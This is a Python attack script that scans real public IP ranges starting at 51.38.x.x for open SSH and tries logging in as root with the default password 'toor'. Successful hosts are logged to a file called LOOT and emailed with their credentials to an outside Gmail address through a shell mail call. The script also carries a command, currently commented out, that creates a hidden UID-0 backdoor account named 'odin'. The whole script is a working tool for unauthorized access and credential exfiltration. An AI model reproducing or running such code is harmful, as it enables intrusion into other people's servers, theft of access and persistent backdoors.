import paramiko
import socket
import os

def checkPort(ip):
    f = open("LOOT","a+")
    f.write("Checking if 22 is open.\n")
    f.close()
    print("Checking if 22 is open.")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = sock.connect_ex((ip,22))
    if result == 0:
        f = open("LOOT","a+")
        f.write("22 is open.\n")
        f.close()
        print("22 is open.")
        return True
    else:
        f = open("LOOT","a+")
        f.write("22 is closed.\n")
        f.close()
        print("22 is closed.")
        return False
    sock.close()

FIRSTP = 51
SECP = 38
THIRDP = 237
FOURP = 5

while 1:
    host = str(FIRSTP) + "." + str(SECP) + "." + str(THIRDP) + "." + str(FOURP)

    FOURP += 1
    if FOURP == 253:
        FOURP = 5
        THIRDP += 1
        if THIRDP == 255:
            THIRDP = 0
            SECP += 1
            if SECP == 100:
                exit()

    port = 22
    username = "root"
    password = "toor"
    command = 'useradd -u 0 -g 0 -o -m -d /root -s /bin/bash odin; echo -e "destroyer\ndestroyer" | (passwd odin)'

    f = open("LOOT","a+")
    f.write("Trying on >> " + str(host) + "\n")
    f.close()
    print("Trying on >> " + str(host))
    if checkPort(host):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host, port, username, password)
            # stdin, stdout, stderr = ssh.exec_command(command)
            # lines = stdout.readlines()
            f = open("LOOT","a+")
            # f.write("HIT >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> " + str(host) + " >> odin:destroyer")
            f.write("HIT >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> " + str(host) + " >> " + username + ":" + password)
            f.close()
            os.system('echo "HIT >> ' + str(host) + ' >> ' + username + ':' + password + ' | mail -s "HIT" mickaeldecelle@gmail.com')
        except:
            f = open("LOOT","a+")
            f.write("Failed on >> " + str(host) + "\n")
            f.close()
            print("Failed on >> " + str(host))